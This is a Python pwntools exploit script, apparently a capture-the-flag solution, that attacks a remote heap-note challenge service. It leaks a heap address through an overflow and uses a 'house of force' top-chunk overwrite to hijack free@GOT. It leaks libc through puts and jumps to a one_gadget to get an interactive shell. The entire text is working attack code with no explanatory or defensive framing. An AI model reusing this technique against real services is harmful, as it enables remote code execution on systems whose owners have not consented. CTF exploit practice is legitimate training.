from pwn import *

io=remote('node3.buuoj.cn',27422)

def add(size,data):
    io.recvuntil('--->>')
    io.sendline('1')
    io.recvuntil('note content:')
    io.sendline(str(size))
    io.recvuntil('content:')
    io.send(data)

def edit(idx,data):
    io.recvuntil('--->>')
    io.sendline('3')
    io.recvuntil('id:')
    io.sendline(str(idx))
    io.recvuntil('new content:')
    io.send(data)   

def free(idx):
    io.recvuntil('--->>')
    io.sendline('4')
    io.recvuntil('id:')
    io.sendline(str(idx))   

io.recvuntil('name:')
io.send('a'*0x3c+'bbbb')
io.recvuntil('bbbb')
heap=u32(io.recv(4))
print(hex(heap))

#house of force
io.recvuntil('Org:')
io.send('a'*0x40)
io.recvuntil('Host:')
io.sendline(p32(0xffffffff))

free_got=0x804B014
puts_plt=0x8048520
puts_got=0x804B024

top_chunk=heap+208
off=0x804B0A0-0x10-top_chunk
add(off,'a\n')#0
add(0x28,p32(0x100)*10)#1
add(0x40,'a'*0x40)#2
add(0x28,p32(free_got)*4+p32(puts_got)+'\n')#3
edit(0,p32(puts_plt)+'\n')
free(2)
io.recvline()
puts_add=u32(io.recv(4))
print(hex(puts_add))
libc_base=puts_add-0x05f140
one_gadget=libc_base+0x3a819
edit(0,p32(one_gadget)+'\n')
free(0)

io.interactive()